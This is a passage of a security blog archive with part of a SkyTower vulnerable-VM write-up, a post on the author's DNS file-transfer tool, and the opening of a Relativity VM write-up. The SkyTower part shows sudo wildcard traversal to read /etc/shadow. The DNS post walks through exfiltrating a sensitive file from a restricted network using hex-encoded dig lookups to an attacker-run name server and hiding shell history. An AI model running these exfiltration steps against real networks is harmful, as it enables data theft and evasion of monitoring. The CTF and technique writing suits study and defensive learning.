<p>Other than that things seemed pretty normal. I decided to check out the other user <code>sara</code> too. This user has a similar <code>exit</code> in the <code>.bashrc</code> which I just removed. There was one distinct difference during enumeration though&hellip;</p>

<figure class='code'><figcaption><span>sara sudo</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sara@SkyTower:~<span class="nv">$ </span>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for </span>sara on this host:
</span><span class='line'>    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User sara may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/cat /accounts/*, <span class="o">(</span>root<span class="o">)</span> /bin/ls /accounts/*
</span></code></pre></td></tr></table></div></figure>


<p>This user may execute some commands as root using <code>sudo</code>. <code>sudo</code> allows you to specify what those commands are, if not all. There was one problem with this configuration though. <code>*</code> is a wildcard character, and as such, anything after <code>cat /accounts/</code> may also be run. This means that things like <code>sudo cat /accounts/../../etc/shadow</code> will work as the wildcard allows us to do a form of directory traversal.</p>

<h2>pwnd</h2>

<p>So, to complete SkyTower:</p>

<figure class='code'><figcaption><span>SkyTower pwn</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sara@SkyTower:~<span class="nv">$ </span>sudo cat /accounts/../../root/flag.txt
</span><span class='line'>Congratz, have a cold one to celebrate!
</span><span class='line'>root password is theskytower
</span></code></pre></td></tr></table></div></figure>


<p>Thanks to <a href="https://twitter.com/telspacesystems">@telspacesystems</a> for the fun experience. I learnt something so for this was totally worth it!</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/03/11/dnsfilexfer-yet-another-take-on-file-transfer-via-dns/">dnsfilexfer - yet another take on file transfer via DNS</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-03-11T06:10:00+02:00" pubdate data-updated="true">Mar 11<sup>th</sup>, 2014</time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>This is not a old technique. Many a person has written about it and many technical methods are available to achieve this. Most notably, a concept of getting TCP type connectivity over DNS tunnels is probably a better idea to opt for should you wish to actually use technology like this. A quick Google even revealed full blown dns-tunneling-as-a-service type offers.</p>

<h3>this article is not&hellip;</h3>

<p>&hellip; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.</p>

<h2>the idea</h2>

<p>At its very core, the idea of DNS file transfers and DNS tunnelling resides in the fact that a few cleverly crafted DNS queries could be merged &amp; formatted together to form part of a larger chunk of data. While DNS itself is not actually meant for file transfers, this method is obviously a very hacky approach.</p>

<p>Consider the following scenario.</p>

<p>You have access to a very <em>secure</em> network. <em>Secure</em> in the sense that the firewalls are configured to allow <strong>NO</strong> outbound tcp connectivity. In fact, UDP is also limited to only allow DNS queries as a primary DNS server lives outside of this <em>secure</em> network, and provides most of the networks for this company with DNS services. Lets not dabble in the fact that the network can not receive any software updates etc, and just focus on the fact that it is a highly restricted network and contains potentially sensitive data.</p>

<p>You on the other hand, are responsible to come into the data centre where this network resides physically, and have some configuration changes to make, which involves you logging onto the console of a said server. While logged in, you notice a file, <code>z300_technical_diagrams.zip</code>. Looks pretty juicy! But, the file is close to 20MB, and the flash disk you have with you will be handed back to its owner before you leave the premises. You are also very aware of the security posture of this network and know that the only connectivity that is allowed outbound is udp/53.</p>

<p>Luckily for you, you have a DNS file transfer server setup at home. You choose to use that as you would like to be sure that incase there may be some form of IPS on the border, your traffic wont be filtered. Your traffic will look like legit, semi &lsquo;non-suspect&rsquo; DNS lookup requests.</p>

<h2>the setup</h2>

<p>So, to get the file <code>z300_technical_diagrams.zip</code> out of this network, we need to create DNS lookups of parts of this file, specifying the name server to use. We test that lookups work with a quick dig to our name server at home. (server ip swapped to 127.0.0.1)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% dig A 123456.fake.com @127.0.0.1
</span><span class='line'>
</span><span class='line'>; &lt;&lt;&gt;&gt; DiG 9.8.3-P1 &lt;&lt;&gt;&gt; 123456.fake.com @127.0.0.1
</span><span class='line'>;; global options: +cmd
</span><span class='line'>;; Got answer:
</span><span class='line'>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24059
</span><span class='line'>;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
</span><span class='line'>
</span><span class='line'>;; QUESTION SECTION:
</span><span class='line'>;123456.fake.com.    IN A
</span><span class='line'>
</span><span class='line'>;; ANSWER SECTION:
</span><span class='line'>123456.fake.com.  60 IN A  127.0.0.1
</span><span class='line'>
</span><span class='line'>;; Query time: 0 msec
</span><span class='line'>;; SERVER: 127.0.0.1#53(127.0.0.1)
</span><span class='line'>;; WHEN: Tue Mar 11 07:55:31 2014
</span><span class='line'>;; MSG SIZE  rcvd: 49</span></code></pre></td></tr></table></div></figure>


<p>Great, so it seems like we have working comms to our own name server, as we got a answer of 127.0.0.1. Our server will always respond with 127.0.0.1 being the IP.</p>

<h2>preparing the file</h2>

<p>With comms working to our name server, we can get some information about the file and test if a hex dump tool like <code>xxd</code> is available. This will enable us to break the file up in to little parts that can be used as DNS questions.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% ls -lah z300_technical_diagrams.zip
</span><span class='line'>-rw-r--r--  1 bob  staff   20.1M Jan 27 01:01 z300_technical_diagrams.zip
</span><span class='line'>% xxd -p z300_technical_diagrams.zip
</span><span class='line'>504b03040a000000000042a9384400000000000000000000000017001c00
</span><span class='line'>7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
</span><span class='line'>e3523947e35275780b000104f50100000414000000504b03040a00000000
</span><span class='line'>0049a938440000000000000000000000001b001c007068616e746f6d6a73
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Great. It looks like we have everything we need to make this work. :)</p>

<h2>&lsquo;transferring&rsquo; the file</h2>

<p>Now, we will use a simple awk, and prepare a few dig queries to our name server and finally, run the actual lookups. The best way to explain what is happening here is to actually show it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% xxd -p z300_technical_diagrams.zip | awk '{ print "dig " $1 ".fake.io @127.0.0.1 +short" }'
</span><span class='line'>dig 2e965f1608019c826a5b89b9a881b6df63a634a3ca83c01aa349411e4fa0.fake.io @127.0.0.1 +short
</span><span class='line'>dig 37aec06d77acd4d16ca559e008078e8bbfa2e1f0e3db8b995885fe398d48.fake.io @127.0.0.1 +short
</span><span class='line'>dig 763b55cfda9b977328588068d3a9b63b06811f5ecfae570e3f6e2d8b5e34.fake.io @127.0.0.1 +short
</span><span class='line'>dig 97b223da3800b1341ced3cc9e8542f53c0e123965e24591a9b75f58d4330.fake.io @127.0.0.1 +short
</span><span class='line'>dig eb9287c294832c7a79a84dc1cd066baf7e51adabc070eab8477a7cc4530d.fake.io @127.0.0.1 +short
</span><span class='line'>dig 9110217bcafcbaa48eee91567bfd698a76c70961ca9fea3402f929d4ee87.fake.io @127.0.0.1 +short
</span><span class='line'>dig f543e9a8c27602aeb2f6744a5097a7f20404f3e53d513c11d63e70434a71.fake.io @127.0.0.1 +short
</span><span class='line'>dig 61e85f16195f2fa75a82368cfbc781ace543ab22fcb72c97fbdb03015f8c.fake.io @127.0.0.1 +short
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>As you can see, the output has generated a whole bunch of potential lookups for random strings. The same command above is rerun, but with <code>| sh</code> at the end, performing the actual lookups.
On our server, we have tcpdump listening on port 53, writing all of the recorded packets to a file.</p>

<h2>back home</h2>

<p>We close our bash session with <code>kill -9 $$</code> to prevent any history from writing and relogin, completing the original work we came for.</p>

<p>Back home, it was time to stop the <code>tcpdump</code> that was running, and attempt to reassemble that file. The domain we used for the lookups was <code>fake.io</code>, so we just grep the output for that to ensure that we got the relevant parts (real ip&rsquo;s masked to 127.0.0.1):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% tcpdump -r raw -n | grep fake.io
</span><span class='line'>reading from file raw, link-type NULL (BSD loopback)
</span><span class='line'>19:31:32.919144 IP 127.0.0.1.49331 &gt; 127.0.0.1.53: 39001+ A? 504b03040a000000000042a9384400000000000000000000000017001c00.fake.io. (86)
</span><span class='line'>19:31:32.925135 IP 127.0.0.1.51116 &gt; 127.0.0.1.53: 23736+ A? 7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47.fake.io. (86)
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Excellent! As we can see, we got some recorded requests, similar to those that we originally sent earlier in the day. Lets filter the output a little more, so that we sit with only the original hashes as output.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1
</span><span class='line'>reading from file raw, link-type NULL (BSD loopback)
</span><span class='line'>504b03040a000000000042a9384400000000000000000000000017001c00
</span><span class='line'>7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
</span><span class='line'>[snip]</span></code></pre></td></tr></table></div></figure>


<p>Lastly, we can pipe all of this through <code>xxd -r</code> and redirect the output to a new file. If all went well, this file <em>should</em> be <code>z300_technical_diagrams.zip</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% tcpdump -r raw -n | grep fake.io | cut -d' ' -f 8 | cut -d. -f 1 | xxd -r &gt; z300_technical_diagrams.zip
</span><span class='line'>
</span><span class='line'>% file z300_technical_diagrams.zip
</span><span class='line'>z300_technical_diagrams.zip: Zip archive data, at least v1.0 to extract</span></code></pre></td></tr></table></div></figure>


<h2>python all the things</h2>

<p>Using only some bash commands, we have managed to transfer a file over the network using only DNS. This method however assumes that you have a running name server on the remote end that would actually respond to your requests, otherwise your lookups may take a very long time for the <code>dig</code> command to timeout, and it would retry like 3 times which would mean you would need to <code>uniq</code> your results before you <code>xxd -r</code> them.</p>

<p>So, in order for me to <em>learn something new</em>, I figured I&rsquo;d write some python to help with this file transferring over DNS. Heck, maybe it could even result in something actually useful :o</p>

<p>The idea is simple. Create a fake DNS server that would listen and parse DNS packets. Allow for simple switches to write the received files to disk, and add a optional layer of encryption to the requests.</p>

<h1>dnsfilexfer</h1>

<p>So, I took a day (literally), and a few more hours afterwards for bug fixes and wrote something that does this. Consisting of two pretty self explanatory parts; <code>dns_send.py</code> &amp; <code>dns_recv.py</code>, one is able to &lsquo;send files&rsquo; using DNS lookups and store them on the remote end. You also have the option of only using the send part with the <code>-X</code> flag, and have the output ready to use with <code>xxd -r</code> later on your server.</p>

<p>The code can be <a href="https://github.com/th3l33k/dnsfilexfer">found here</a></p>

<h2>sample usage</h2>

<p>Below a full example of the usage, both on the client &amp; server:</p>

<p>We start the &lsquo;server&rsquo; component along with a secret that will be used to decrypt received messages. For now, we have omitted <code>-F</code> as we are not going to write the message to a file, yet.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% sudo python dns_recv.py --listen 0.0.0.0 --secret
</span><span class='line'>What is the secret?
</span><span class='line'>[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
</span><span class='line'>%</span></code></pre></td></tr></table></div></figure>


<p>With our &lsquo;server&rsquo; started, we go to a client, and prepare the sending of a message by creating a sample message, and using the send script to sent it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% echo "This is a test message that will be sent over DNS\n Cool eh?" &gt; /tmp/message
</span><span class='line'>% cat /tmp/message
</span><span class='line'>This is a test message that will be sent over DNS
</span><span class='line'>Cool eh?
</span><span class='line'>
</span><span class='line'>% python dns_send.py --server 127.0.0.1 --file /tmp/message --indentifier dns_message_test --secret
</span><span class='line'>What is the secret?
</span><span class='line'>[INFO] Message is encypted with the secret
</span><span class='line'>---START OF MESSAGE---
</span><span class='line'>/lHsvTZT3nJfQgdtUWSpKDqrpKuK+eLrU3bpAp9aNDJt6K/mwEc8sBUaJybPh7r5h2AOkJVezwBBODSV9hFM8w==
</span><span class='line'>---END OF MESSAGE---
</span><span class='line'>[INFO] Sending lookup for : 00006:10000000000000000000000000000000000000000000000000.fake.io
</span><span class='line'>[INFO] Sending lookup for : 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io
</span><span class='line'>[INFO] Sending lookup for : 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io
</span><span class='line'>[INFO] Sending lookup for : 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io
</span><span class='line'>[INFO] Sending lookup for : 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io
</span><span class='line'>[INFO] Sending lookup for : 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io
</span><span class='line'>[INFO] Sending lookup for : 000638773d3d.fake.io
</span><span class='line'>[INFO] Sending lookup for : 00000000000000000000000000000000000000000000000000000000.fake.io
</span><span class='line'>[INFO] Message sent in 8 requests</span></code></pre></td></tr></table></div></figure>


<p>We can see that the message was &lsquo;sent&rsquo; using 8 requests and the <code>--START OF MESSAGE--</code> preview contains the encrypted version of our message.
Looking at the server, we see that the message is received:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>% sudo python dns_recv.py --listen 0.0.0.0 --secret
</span><span class='line'>Password:
</span><span class='line'>What is the secret?
</span><span class='line'>[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
</span><span class='line'>[INFO] Full resource record query was for: 00006:10000000000000000000000000000000000000000000000000.fake.io.
</span><span class='line'>[INFO] Processing frame 00006:10000000000000000000000000000000000000000000000000
</span><span class='line'>[INFO] Full resource record query was for: 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io.
</span><span class='line'>[INFO] Processing frame 0001646e735f6d6573736167655f7465737400000000000000000000
</span><span class='line'>[INFO] Full resource record query was for: 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io.
</span><span class='line'>[INFO] Processing frame 00028bf2046ae2144be75d2ce780b3f992e2c368021e
</span><span class='line'>[INFO] Full resource record query was for: 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io.
</span><span class='line'>[INFO] Processing frame 00032f6c487376545a54336e4a6651676474555753704b447172704b754b
</span><span class='line'>[INFO] Full resource record query was for: 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io.
</span><span class='line'>[INFO] Processing frame 00042b654c7255336270417039614e444a74364b2f6d7745633873425561
</span><span class='line'>[INFO] Full resource record query was for: 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io.
</span><span class='line'>[INFO] Processing frame 00054a796250683772356832414f6b4a56657a7742424f4453563968464d
</span><span class='line'>[INFO] Full resource record query was for: 000638773d3d.fake.io.
</span><span class='line'>[INFO] Processing frame 000638773d3d
</span><span class='line'>[INFO] Full resource record query was for: 00000000000000000000000000000000000000000000000000000000.fake.io.
</span><span class='line'>[INFO] Processing frame 00000000000000000000000000000000000000000000000000000000
</span><span class='line'>[OK] Message seems to be intact and passes sha1 checksum of 8bf2046ae2144be75d2ce780b3f992e2c368021e
</span><span class='line'>[OK] Message was received in 8 requests
</span><span class='line'>[INFO] Message has been decrypted with the configured secret
</span><span class='line'>Message identifier: dns_message_test
</span><span class='line'>
</span><span class='line'>---START OF MESSAGE---
</span><span class='line'>This is a test message that will be sent over DNS
</span><span class='line'>Cool eh?
</span><span class='line'>
</span><span class='line'>---END OF MESSAGE---</span></code></pre></td></tr></table></div></figure>


<p>The scripts have some basic checksumming checks to ensure that the message that is received on the other end is intact. Of course, this is not limited to ASCII transfers only. Any file format inc. binary formats <em>should</em> work just fine. <strong>HOWEVER</strong> Be cautious of that fact that the file size determines the amount of requests required to send the message across the wire.</p>

<p>Using encryption by specifying a secret is entirely optional, as well as specifying a output file for the receiver script.</p>

<h2>Some afterthoughts</h2>

<p>So this technique obviously has many challenges, such as the classic stateless nature of UDP that may cause out-of-sequence/lost frames (I am actually thinking of building some re-transmission logic into the scripts for lulz), the fact that the outgoing DNS port may be destination natted etc. In the case of a destination nat for udp/53, once could potentially query a zone whos name server you have control over, and capture the requests using a tcpdump there. One would then specify a specific fake domain to use with <code>--domain</code> on the sending script, and have something like <code>fake.&lt;your valid zone&gt;.com</code>, which will result in you still being able to grep for <code>fake</code> in the tcpdump replay.</p>

<h3>further reading</h3>

<p><a href="https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306  ">https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306  </a>
<a href="http://www.aldeid.com/wiki/File-transfer-via-DNS">http://www.aldeid.com/wiki/File-transfer-via-DNS</a></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm/">/root/flag.txt - Solving the Relativity Vulnerable VM</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-18T06:47:00+02:00" pubdate data-updated="true">Nov 18<sup>th</sup>, 2013</time>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>foreword</h2>

<p>At the time of writing this post, this VM was part of a local security communities (<a href="http://zacon.org.za/">zacon</a>) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at <a href="http://vulnhub.com/entry/devrandom_relativity,55/">VulnHub</a>. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.</p>

<p>I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.</p>

<h3>the challenge</h3>

<p>It all started with an announcement on the Zacon mailing list. A friendly heads-up about the challenge and some details were made available. We were given a hostname of where the challenge lived with clear instructions to find <code>flag.txt</code>. Sounds simple. I slapped the hostname as a url in a browser and was met with a image of M.C. Eshter&rsquo;s &lsquo;Relativity&rsquo;. Great. Something to start thinking about. I also nmapped the box. I mean, how else would you start, right? :)</p>

<figure class='code'><figcaption><span>192.168.56.21 Nmap</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.21 <span class="o">(</span>192.168.56.21<span class="o">)</span>
</span><span class='line'>Host is up <span class="o">(</span>0.0024s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 997 filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>21/tcp open  ftp
</span><span class='line'>22/tcp open  ssh
</span><span class='line'>80/tcp open  http
</span></code></pre></td></tr></table></div></figure>


<p>Alright. This gives you a good idea of whats happening on the host, as well as some points to start off with.</p>

<h3>initial enumeration</h3>

<p>Enumeration is key to starting something like this. The more you know about the host, the more you are able to adapt and think about as you go through the challenge. So, we know we have a SSH Server, a FTP server and a Web server exposed.</p>

<p>Starting with the SSH server, I tried to check if password based authentication was on. Maybe Mr MC Eshter had an account on this box? You never know :)</p>

<figure class='code'><figcaption><span>SSH Login</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ssh eshter@192.168.56.21</span>
</span><span class='line'>Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
</span></code></pre></td></tr></table></div></figure>


<p>So, we now know only key based authentication works. Thats fine. Next up was the FTP service.</p>

<figure class='code'><figcaption><span>FTP Login</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: anonymous
</span><span class='line'>331 Password required <span class="k">for </span>anonymous.
</span><span class='line'>Password:
</span><span class='line'>530 Login incorrect.
</span><span class='line'>Login failed.
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt;
</span></code></pre></td></tr></table></div></figure>


<p>No anonymous FTP logins either. It appears that the Server&rsquo;s FTP banner has been customised and is maybe using the mod_sql plugin. A quick Google for mod_sql revealed that this may be ProFTPD with the mod_sql plugin. Great. This is an important piece of information. To complete the enumeration I moved on to the web server. It was time to inspect some request responses.</p>

<figure class='code'><figcaption><span>Apache tokens.</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># curl -v 192.168.56.21</span>
</span><span class='line'>* About to connect<span class="o">()</span> to 192.168.56.21 port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>*   Trying 192.168.56.21...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 192.168.56.21 <span class="o">(</span>192.168.56.21<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET / HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 192.168.56.21
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>* additional stuff not fine transfer.c:1037: 0 0
</span><span class='line'>* HTTP 1.1 or later with persistent connection, pipelining supported
</span><span class='line'>&lt; HTTP/1.1 200 OK
</span><span class='line'>&lt; Date: Sat, 28 Sep 2013 23:12:28 GMT
</span><span class='line'>&lt; Server: Apache/2.2.23 <span class="o">(</span>Fedora<span class="o">)</span>
</span><span class='line'>&lt; Last-Modified: Tue, 05 Mar 2013 03:24:29 GMT
</span><span class='line'>&lt; ETag: <span class="s2">&quot;4ecb-82-4d72502eec502&quot;</span>
</span><span class='line'>&lt; Accept-Ranges: bytes
</span><span class='line'>&lt; Content-Length: 130
</span><span class='line'>&lt; Connection: close
</span><span class='line'>&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span><span class='line'>&lt;
</span><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;&lt;title&gt;M.C. Escher - Relativity&lt;/title&gt;&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>&lt;/br&gt;
</span><span class='line'>&lt;center&gt;&lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&quot;artwork.jpg&quot;</span>&gt;&lt;/center&gt;
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;
</span><span class='line'>* Closing connection <span class="c">#0</span>
</span></code></pre></td></tr></table></div></figure>


<h4>putting the enumeration together</h4>

<p>With the little bit of poking around we have just done, we are able to say that this may be a Fedora Core Server, running Apache 2.2.13, with ProFTPD and the mod_sql plugin. This already gives us quite a lot to work with in the sense of researching the respective software in search of known vulnerabilities.</p>

<p>With me loving web based security, my first attempt at further enumerating the machine was via the web server. I searched for <code>cgi-bin/</code> type problems, potentially hidden directories via <code>robots.txt</code>, username enumeration via home directories etc. to no avail. At some stage it became very apparent that the initial entry point for this server was not via the Web.</p>

<h3>the initial attack</h3>

<p>The next step was the FTP server. As it was purposely disclosing the fact that it was using mod_sql, instinct kicked in and I attempted to check the responses if I tried to login with username <strong>&lsquo;</strong> and password <strong>&rsquo;</strong>.</p>

<figure class='code'><figcaption><span>mod_sql SQLi attempt</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># ftp 192.168.56.21</span>
</span><span class='line'>Connected to 192.168.56.21.
</span><span class='line'>220 Welcome to Relativity FTP <span class="o">(</span>mod_sql<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>192.168.56.21:root<span class="o">)</span>: <span class="s1">&#39;</span>
